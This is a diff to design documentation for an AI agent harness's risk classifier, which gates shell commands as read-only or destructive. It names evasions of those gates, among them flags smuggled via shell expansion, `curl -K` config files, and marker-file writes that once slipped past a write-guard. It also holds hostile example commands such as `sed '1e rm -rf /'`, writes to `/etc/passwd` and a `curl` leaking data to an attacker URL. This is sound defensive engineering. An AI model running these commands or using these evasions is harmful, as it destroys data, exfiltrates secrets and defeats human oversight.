@@ -149,7 +149,6 @@ classification the runtime gate uses.
 
 A second `low`-severity floor recognizes any *provably read-only* Bash
 command (`git status`, `git diff`, `grep`, `cat`, `ls`, `head`, `cd`,
-`sed` without `-i`, `curl` without `-X`/`-d`/`--upload-file`,
 `npm audit`, `npm ls`, `sort FILE`, `tree DIR`, `file FILE`, ...),
 reusing the same metachar-hardened classifier the understanding gate uses
 to allow reads without an approved report
@@ -229,38 +228,13 @@ Some bins are classified read-only only when their write flags are absent
   minimum leaves `--rec` correctly read-only (real git resolves it to
   `--recurse-submodules`, unrelated and harmless). Out of scope (separate
   tasks): path-qualified `git -C <dir>` (5b5d1022) and config/env-borne
-  vectors (`GIT_EXTERNAL_DIFF`, `protocol.ext.allow`). A path-qualified
-  invocation like `git -C <dir> rev-list ...` therefore still does NOT
-  reach this floor and stays unclassified — task 2929c5b7 deliberately
-  does not extend `isReadOnlyGitInvocation` to cover it (out of that
-  task's scope too); it is still protected against the fail-closed
-  critical-severity deny by the `risk.severity_at_least` change below
-  ("Unclassified actions and the fail-close rule"), just not floored to
-  `low` the way `git -C`-free reads are.
-- `sed` (task 2929c5b7): read-only when no in-place-edit flag appears —
-  `-i`, GNU's optional glued suffix form (`-i.bak`), or the long form
-  `--in-place` / `--in-place=SUFFIX`. Without `-i`, sed only ever writes
-  its result to stdout. Deliberately conservative and NOT abbreviation-
-  or getopt-cluster-measured the way the git/sort/file guards above are
-  (a documented simplification, not a full audit): any short token
-  starting with a single `-` that contains the letter `i` anywhere
-  forfeits the floor, including the common combined idiom `-ni`
-  (quiet + in-place) and a token whose own glued script text happens to
-  contain the letter `i` (`-e's/is/isnt/'`) — an accepted false
-  positive, same "over-block a read, never under-block a write" posture
-  as `sort`'s guard above. A positional script operand (no leading `-`)
-  is unaffected, so `sed -n '/is/p' file` still floors.
-- `curl` (task 2929c5b7): read-only when it carries no data/upload/form
-  flag (`-d` / `--data` / `--data-raw` / `--data-binary` /
-  `--data-urlencode` / `--data-ascii` / `--json` / `-F` / `--form` /
-  `--form-string` / `-T` / `--upload-file`, exact or glued short form)
-  and no `-X` / `--request` method other than `GET`/`HEAD` (a value-less
-  `-X`/`--request` fails closed, not treated as GET). A curated,
-  DISCLOSED-boundary flag list, not a full measured audit: `-K` /
-  `--config` reads flags — including `-X`/`-d` — from an operator-named
-  file this guard never opens, the same class of evasion `npm`'s
-  `--registry` guard above closes for npm specifically but this guard
-  does not close for curl.
+  vectors (`GIT_EXTERNAL_DIFF`, `protocol.ext.allow`). What is out of
+  scope there is the WRITE-flag guard's handling of a `-C`-qualified
+  write verb, not the read floor: a path-qualified READ
+  (`git -C <dir> rev-list ...`, `git -C <dir> status`) does reach this
+  floor and is classified `low`, because `skipGitGlobalOptions` walks
+  past `-C <dir>` before the subcommand check runs. Measured directly
+  against `isReadOnlyBashCommand`, unchanged by task 2929c5b7.
 
 Two more entries floor a whole class of commands that were previously
 unclassified and, on a production-resolved session (checked-out `main`
@@ -344,6 +318,163 @@ The same guarantees hold:
   gated). The classifier inspects the full, uncapped command for this
   reason, so a write hidden past the 16 KiB subject cap cannot slip
   through either.
+
+#### `sed` and `curl` read-only floors (Risk Classifier only, task `2929c5b7`)
+
+`sed` and `curl` get their own `low`-severity floors, and those floors are
+wired ONLY into the Risk Classifier. They are exported from
+`src/runtime/read-only-bash.ts` next to `isReadOnlyKubectlCommand` but are
+deliberately NOT part of `isReadOnlyBashCommand`, for the same
+blast-radius reason as the kubectl floor: the understanding-gate PreToolUse
+blocker and the solution-acceptance write-guard
+(`src/cli/pack/hook-solution-acceptance-writeguard.ts`) consume that shared
+predicate directly and return "allowed" for anything it accepts BEFORE
+their own checks run. An earlier round of this task folded `sed`/`curl`
+into the shared predicate and thereby widened the write-guard: `curl -o
+<verdict-dir>/marker.json <url>`, `curl --output ...`, `sed
+'s/a/b/w <verdict-dir>/marker.json' f` and `sed -n 'w
+<verdict-dir>/marker.json' f` all went from BLOCKED to ALLOWED. Pinned by
+tests in `tests/cli/pack-hook-solution-acceptance-writeguard.test.ts`.
+
+Both floors are ALLOWLISTS and fail closed. Every token after the head
+must be recognized (a named read-only flag, such a flag's value, or a
+plain operand); an unknown flag, an unknown short-cluster character, a
+missing flag value, or a token carrying a live shell expansion forfeits
+the floor. Forfeiting is cheap: the command stays unclassified, which is
+approval-gated and never hard-blocked. Under-blocking is not cheap.
+
+**Live shell expansion.** A token whose `$`, backtick, `{`, `}`, `*`, `?`,
+`[` or `]` is not quoted away forfeits either floor, because the shell can
+rewrite one such token into SEVERAL argv words and thereby smuggle a flag
+past a token allowlist (`curl $FLAGS url` with `FLAGS='-o /etc/passwd'`,
+`sed -n 1p {-i,x}`). Quoting is honored: inside single quotes all of them
+are literal, and inside double quotes the glob/brace characters are
+literal while `$` and a backtick stay live. So `sed -n '$p' f` and `curl
+'https://h/p?a=b'` keep the floor while `sed -n "/$X/p" f` and the
+unquoted `curl https://h/p?a=b` forfeit it. Quote the URL to stay floored.
+
+**`sed`.** Floored to `low` only when every flag is on the read-only
+allowlist (`-n`/`--quiet`/`--silent`, `-E`/`-r`/`--regexp-extended`,
+`-e`/`--expression`, `-s`/`--separate`, `-z`/`--null-data`,
+`-u`/`--unbuffered`, `--posix`) AND every script parses as a read-only sed
+program. Because the flag set is an allowlist, `-i` in every spelling
+(`-i`, `-i.bak`, the cluster `-ni`, `--in-place`, `--in-place=SUFFIX`) and
+`-f`/`--file` forfeit by never being ON it, rather than by being
+enumerated as write flags.
+
+The script scan matters, and corrects a false premise an earlier round of
+this task shipped ("without `-i`, sed only writes to stdout"). It does
+not: sed's `w FILE` command and the `s///w FILE` substitution flag write
+an operator-named file with no `-i`, no redirection and no shell
+metacharacter, `-f SCRIPTFILE` executes a script this classifier never
+reads, and GNU sed's `e` command and `s///e` flag execute a shell command.
+The scan therefore accepts only scripts built from addresses (a line
+number, `$`, `/regex/`, a `first,last` or `first~step` range, optional
+`!`) plus the commands `p P d D n N h H g G x l = q Q z F`, `{`/`}`
+blocks, branch/label commands (`b t T :`), `y///`, and `s///` whose flags
+are drawn from `g p i I m M` and digits only. Anything else, including an
+unterminated regex or a custom `\c...c` address delimiter, forfeits.
+Examples that keep the floor: `sed -n '1,5p' f`, `sed -E 's/a/b/' f`,
+`sed -n -e '/x/p' f`, `sed -n '/warning/p' f`. Examples that forfeit:
+`sed 's/a/b/w /etc/passwd' f`, `sed -n 'w /etc/passwd' f`,
+`sed '1e rm -rf /' f`, `sed -f script.sed f`, `sed -ni f`.
+
+**`curl`.** Floored to `low` only when every token is a URL operand or a
+flag from these sets:
+
+- no value: `-s`/`--silent`, `-S`/`--show-error`, `-L`/`--location`,
+  `-f`/`--fail`, `-I`/`--head`, `-G`/`--get`, `-k`/`--insecure`,
+  `-v`/`--verbose`, `-N`/`--no-buffer`, `-i`/`--include`, `--compressed`,
+  `-4`/`--ipv4`, `-6`/`--ipv6`.
+- one inert value: `-H`/`--header`, `-A`/`--user-agent`, `-m`/`--max-time`,
+  `--connect-timeout`, `--retry`, `--url`, `-w`/`--write-out`,
+  `-e`/`--referer`, `-b`/`--cookie`, `--max-redirs`, `-x`/`--proxy`.
+- `-X`/`--request`, whose value (glued, `=`-joined, or the next token,
+  compared case-insensitively) must be `GET` or `HEAD`. A value-less
+  `-X`/`--request` forfeits rather than being read as GET.
+
+Short-flag clusters are decomposed CHARACTER BY CHARACTER, so `-sd @x`
+forfeits on the `d` even though it starts with an allowlisted `s`, and
+`-sXPOST` forfeits on the method. Because the sets are allowlists, every
+local-write flag (`-o`/`--output`, `-O`, `-D`/`--dump-header`,
+`-c`/`--cookie-jar`, `-K`/`--config`, `--create-dirs`, `--output-dir`,
+`--etag-save`, `--trace`/`--trace-ascii`, `--stderr`) and every body flag
+(`-d`/`--data*`, `--json`, `-F`/`--form`/`--form-string`,
+`-T`/`--upload-file`) forfeits by construction rather than by
+enumeration, and so does any flag a future curl adds. The `-K`/`--config`
+evasion an earlier round disclosed as NOT closed is closed by this
+design: `-K` is simply not on the allowlist.
+
+Disclosed residual: a floored GET can still carry data in its URL
+(`curl 'https://attacker/?leak=...'` is `low`). The floor decides whether
+the invocation WRITES, not whether its URL is trustworthy; gate URL
+destinations with an operator classifier pattern or an egress control if
+that matters for your deployment.
+
+#### Built-in destructive floor (task `2929c5b7`)
+
+`src/runtime/destructive-shell-floor.ts` classifies a closed set of
+mutating heads in the BINARY, composed into `classifyRisk` under the same
+highest-severity-wins rule as every other floor. It is evaluated before
+the benign floors, so a recognized mutating head never also takes a `low`
+floor, and an operator pattern can always raise above it.
+
+**Why it is code and not only a manifest pattern.** The
+`risk.severity_at_least: critical` fallback change below ships in the
+binary and takes effect for every install on upgrade. Its compensating
+half, explicit classification for the heads that used to ride the blanket
+fail-close, would otherwise take effect only for installs that ADOPT the
+new `dangerous-shell` template patterns, because `harness init` writes a
+manifest once and never rewrites it. An existing manifest would have taken
+the loosened fallback and lost the hard block in the same upgrade. The
+floor closes that upgrade path; the template patterns are its
+operator-editable MIRROR, not the only line of defence.
+
+| Severity | Recognized shapes |
+| --- | --- |
+| `critical` | `dd` with an `of=` target; `truncate` with `-s`/`--size` (glued `-s0` included); `shred`; `mkfs`, `mkfs.*`; `find ... -delete`; `find ... -exec`/`-execdir rm` |
+| `high` | `git reset --hard`; `git push` with `--force`/`--force-with-lease`/`-f`/a `+refspec`; `git clean -f` (any cluster containing `f`) ; `git checkout .`, `git checkout -- .`, `git restore .`; `chmod`/`chown` with `-R`/`--recursive` (any cluster containing `R`); `sed -i` in any spelling; `curl` with a local-write flag or with a body/non-GET-HEAD-method flag |
+
+Categories follow the shipped patterns: `destructive`+`data_loss` for the
+filesystem and git shapes (`irreversible_action` for `shred`,
+`infrastructure_change` for `mkfs`, `production_mutation`+
+`deployment_change` for `git push --force`),
+`production_mutation`+`network_exfiltration` for a curl request body, and
+`mass_update` alone for `chmod`/`chown -R`, which keeps that profile
+`reversible: true`: a recursive mode or owner change rewrites metadata
+across a tree, which is worth a `high` gate, but the inverse command
+undoes it.
+
+The floor is argv-aware where a regex pattern cannot be. It resolves the
+real head through a path prefix (`/bin/dd`), the shared wrapper vocabulary
+(`VAR=x`, `env`, `command`, `sudo`, `doas`, `nice`, `time`, `timeout`,
+`stdbuf`, `setsid`, `exec`, `nohup`, via `peelWrapperPrefixes` in
+`command-normalize.ts`), a `busybox`/`toybox` multi-call prefix, and a
+nested `sh -c "..."` / `bash -lc '...'` command string, and it examines
+every boundary-delimited segment of a chained command. `dd` reading into a
+pipe (`dd if=/dev/sda | gzip`) is deliberately NOT floored: it mutates
+nothing, and flooring it would hard-block a backup on a
+production-resolved session, which is the false positive this task exists
+to remove.
+
+**Template alignment.** The `dangerous-shell` patterns in `FULL_TEMPLATE`
+and `docs/examples/full-manifest.yaml` were tightened to match this floor
+where a regex can: `truncate` now matches the glued `-s0` form,
+`chmod`/`chown` is short-cluster-aware like `git clean`'s pattern, and the
+`curl` patterns cover `--json`/`-F`/`--form`/`--form-string` and any
+`-X`/`--request` method other than GET/HEAD in any letter case. They stay
+narrower than the floor for the spellings a raw-string regex cannot follow
+(path-qualified, wrapper-wrapped, and `sh -c`-nested invocations, and the
+`git checkout .` form without `--`), which is acceptable BECAUSE the floor
+covers them. `tests/runtime/destructive-shell-floor.test.ts` pins that
+every template pattern's canonical spelling is also caught by the floor at
+the same severity or higher, so the mirror can only be narrower, never
+divergent.
+
+**Not recognized, by design:** a truncating redirection (`cmd > file`).
+This module has no redirection model, and a text heuristic for a bare `>`
+over-matches `2>&1`, heredocs, and comparison operators. See the same
+disclosure under "Unclassified actions and the fail-close rule" below.
 
 #### Kubectl read-only verb floor (decision record, task `da823721`)
 
@@ -798,32 +929,33 @@ does not recognise (no classifier pattern matched) satisfies every
 a concrete environment (the no-match case resolves to the matchable
 name `unknown`), so it is always a real equality test.
 
-**`risk.severity_at_least` is narrower, since task `2929c5b7` (2026-09-01,
-following the 2026-08-06 gate audit).** An unclassified action still
-satisfies `severity_at_least: low` / `medium` / `high` — it is treated
-as sitting at the "high" rung, one below the top of the severity scale
-— but no longer satisfies `severity_at_least: critical` on its own. The
-change: a session whose environment resolved to production denied four
-consecutive read-only investigation commands (`cat`, `sed -n`, `curl`,
-`sshpass ssh`, `node -e`, `git -C ... rev-list`) with the shipped
-`gate-prod-destructive` policy's hard-block envelope, because none of
-them were classified and the OLD blanket "unknown is not safe" rule let
-them satisfy `severity_at_least: critical` too, exactly like a genuine
-`rm -rf /` would. An unknown severity is risk-bearing (an
-approval-required gate on an unrecognized production command still
-fires), but it is not itself proof of the WORST tier — a hard,
-un-overridable-by-the-agent block deserves a real classification.
+**`risk.severity_at_least` is narrower, since task `2929c5b7`.** An
+unclassified action still satisfies `severity_at_least: low` / `medium` /
+`high`: it is treated as sitting one rung below the top of the severity
+scale, "high" on the shipped four-value scale. It no longer satisfies
+`severity_at_least: critical` on its own. An unknown severity is
+risk-bearing, so an approval-required gate on an unrecognized production
+command still fires, but it is not itself proof of the WORST tier, and a
+hard block the agent cannot override deserves a real classification.
+
+The rule exists because the old blanket fallback let a run of
+unrecognized READ commands trip the shipped `gate-prod-destructive`
+policy's hard block on a production-resolved session, exactly as a
+genuine `rm -rf /` would; the measured incident is recorded in the
+CHANGELOG entry for task `2929c5b7`.
 
 This is deliberately paired with two other changes, so the loosened
 fallback does not silently reopen a bypass for a mutating head that
 simply has no classifier pattern:
 
 1. **The common read-only heads are now explicitly floored to `low`**
-   (see "Built-in read-only commands" above): `cat`, `sed` without `-i`,
-   `grep`/`rg`, `ls`, `head`, `tail`, `wc`, `stat`, `file`, `less`/`more`,
-   `diff`, `curl` without `-X`/`-d`/`--upload-file`, and the existing
-   `git` read verbs (`status`, `log`, `rev-parse`, `rev-list`, `show`,
-   `diff`, `branch` without `-D`/`-d`, `ls-files`, `remote -v`, `fetch`).
+   (see "Built-in read-only commands" and "`sed` and `curl` read-only
+   floors" above): `cat`, `grep`/`rg`, `ls`, `head`, `tail`, `wc`,
+   `stat`, `file`, `less`/`more`, `diff`, a read-only `sed` invocation, a
+   read-only `curl` invocation, and the existing `git` read verbs
+   (`status`, `log`, `rev-parse`, `rev-list`, `show`, `diff`, `branch`
+   without `-D`/`-d`, `ls-files`, `remote -v`, `fetch`), including their
+   `git -C <dir>` path-qualified spellings.
    Being explicitly `low` (not merely unclassified) is what actually
    removes these from `gate-prod-destructive`'s scope: the softened
    fallback alone would already do that for the critical threshold, but
@@ -831,8 +963,8 @@ simply has no classifier pattern:
    high`/`medium`/`low` policy, which the softened fallback does NOT.
 
    `ssh <host> <cmd>` and `node -e`/`--eval` are deliberately NOT given
-   this floor, even though the incident that motivated this task
-   included exactly this shape (`sshpass ssh`, `node -e`). Their payload
+   this floor, even though the motivating incident included exactly this
+   shape. Their payload
    is opaque to a regex-and-argv-token classifier: the remote command in
    `ssh <host> "<cmd>"` and the evaluated code in `node -e "<code>"` are
    both unexamined strings the classifier cannot reason about, so a
@@ -853,42 +985,41 @@ simply has no classifier pattern:
    above, the fail-closed fallback).
 2. **The comparably-destructive mutating heads are now explicitly
    classified**, at the severity the shipped classifiers already use for
-   a comparable action (`docs/examples/full-manifest.yaml` /
-   `src/cli/init/templates.ts`'s `dangerous-shell` classifier — kept in
-   lockstep by `tests/cli/init-full-template-parity.test.ts`'s
-   `risk.classifiers[]` drift guard):
-   - `critical` (comparable to `rm -rf` / `terraform destroy`): `dd`
-     (with an `of=` write target), `truncate` (with `-s`/`--size`),
-     `shred`, `mkfs`/`mkfs.*`, `find ... -delete`, `find ... -exec(dir)
-     rm`.
-   - `high` (comparable to `DROP TABLE` / `kubectl delete`): `git reset
-     --hard`, `git push --force`/`--force-with-lease`/`-f`, `git clean
-     -f` (and any short cluster containing `f`, e.g. `-fd`), `git
-     checkout -- .`, `git restore .`, `chmod -R`/`chown -R` (or
-     `--recursive`), `curl -X POST|PUT|PATCH|DELETE`, `curl
-     -d`/`--data*`/`--upload-file`, `sed -i`/`--in-place`.
+   a comparable action. This ships as the BUILT-IN destructive floor
+   (`src/runtime/destructive-shell-floor.ts`, see "Built-in destructive
+   floor" above for the full table), so it takes effect for an EXISTING
+   install on upgrade rather than only for a manifest that adopts the new
+   template patterns. `critical`, comparable to `rm -rf` and `terraform
+   destroy`: `dd` with an `of=` target, `truncate -s`, `shred`, `mkfs`,
+   `find ... -delete`, `find ... -exec(dir) rm`. `high`, comparable to
+   `DROP TABLE` and `kubectl delete`: `git reset --hard`, `git push
+   --force`, `git clean -f`, `git checkout .`, `git restore .`, `chmod`/
+   `chown -R`, `sed -i`, and a `curl` that writes a local file or sends a
+   body. The `dangerous-shell` patterns in
+   `docs/examples/full-manifest.yaml` and `src/cli/init/templates.ts`
+   (kept in lockstep by `tests/cli/init-full-template-parity.test.ts`)
+   are the operator-editable mirror of that floor.
 
    **Known, disclosed boundary, NOT closed by this task:** a truncating
-   redirection (`cat x > /etc/y`, or any bare `>` write) is NOT given an
-   explicit classifier pattern. The Risk Classifier's patterns are plain
-   regexes over the raw command string — there is no redirection AST or
-   token model here the way `read-only-bash.ts` has one for argv flags
-   — so a regex heuristic for a bare `>` would have an unacceptable
-   false-positive rate against `2>&1`, heredocs, and comparison operators
-   inside scripts. This gap already existed before task `2929c5b7`
-   (a redirected write was always either caught by an operator-authored
-   pattern or fell to the fail-close); what changed is that the fail-close
-   itself is now weaker at the critical tier, so an UNCLASSIFIED
-   redirected write is risk-bearing at `high` (approval-required) rather
-   than `critical` (hard-blocked) the moment it reaches this specific
-   gate. Tighten a deployment-specific classifier pattern for a redirect
-   shape that matters to your production targets if this residual gap is
-   unacceptable for your policy.
+   redirection (`cat x > /etc/y`, or any bare `>` write) is recognized
+   neither by a classifier pattern nor by the built-in floor. The
+   patterns are plain regexes over the raw command string, and the floor
+   has no redirection model either, so a heuristic for a bare `>` would
+   have an unacceptable false-positive rate against `2>&1`, heredocs, and
+   comparison operators inside scripts. This gap already existed before
+   task `2929c5b7`: a redirected write was always either caught by an
+   operator-authored pattern or fell to the fail-close. What changed is
+   that the fail-close itself is now weaker at the critical tier, so an
+   UNCLASSIFIED redirected write is risk-bearing at `high`
+   (approval-required) rather than `critical` (hard-blocked) at this
+   specific gate. Add a deployment-specific classifier pattern for a
+   redirect shape that matters to your production targets if this
+   residual gap is unacceptable for your policy.
 
 **No manifest opt-in to restore the pre-`2929c5b7` "unclassified
 satisfies `severity_at_least: critical`" behavior exists.** None was
-found in the schema before this task, and this task did not add one —
-if a deployment wants the stricter, pre-fix posture back, the fix is a
+found in the schema before this task, and this task did not add one. If a
+deployment wants the stricter, pre-fix posture back, the fix is a
 tightened `environment.name`-scoped policy at `severity_at_least: high`
 (already fail-closed on unclassified) or an explicit `critical` pattern
 for the specific action that deployment cares about, not a global knob.
@@ -953,17 +1084,26 @@ classifier returned a real match), the `PolicyDecision` record carries
   classification)` before the hint suffix so the agent-facing message
   identifies the cause at a glance.
 - **Block-time deny message (`ux:` policies, since task `2929c5b7`):**
-  when the deny is caused by the fallback, a sentence is PREPENDED to
-  the operator's own `cannot:` text — `"This is an unclassified action
-  in a production context: no risk classifier pattern recognized it, so
-  the fail-closed severity fallback applied rather than a genuine
-  critical-severity match."` — followed by the `cannot:`/`required:`/
+  when the deny is caused by the fallback, a sentence is PREPENDED to the
+  operator's own `cannot:` text, followed by the `cannot:`/`required:`/
   `run:` text exactly as the operator wrote it (added to, never
-  replaced). Before this task, a `ux:`-declared policy's `cannot:` text
-  was rendered completely unchanged for a fallback-caused deny, which
-  meant `gate-prod-destructive`'s own "You cannot run this critical
+  replaced). Everything variable in that sentence is interpolated from
+  the decision, not hard-coded: the RESOLVED environment name, the
+  fallback rung, and the policy's OWN declared threshold. On a
+  production-resolved session gated by `severity_at_least: critical` it
+  reads "This is an unclassified action in a production context: no risk
+  classifier pattern recognized it, so the fail-closed severity fallback
+  (treated as high) satisfied this policy's severity_at_least: critical,
+  rather than a genuine critical-severity match."; an unscoped
+  `severity_at_least: high` policy on a feature branch names that
+  environment and that threshold instead. A policy that set the flag
+  through `risk.category_in` / `action.reversible` (which keep the
+  blanket fallback) and declares no `severity_at_least` gets the
+  threshold-free wording. Before this task, a `ux:`-declared policy's
+  `cannot:` text was rendered completely unchanged for a fallback-caused
+  deny, so `gate-prod-destructive`'s own "You cannot run this critical
   destructive action against production." was shown verbatim for an
-  unrecognized READ the moment the environment resolved to production —
+  unrecognized READ the moment the environment resolved to production,
   the exact false positive this task exists to fix. A genuine
   classification hit (e.g. `rm -rf /x`) still renders the operator's
   `cannot:` text with NO prefix, unchanged from before.
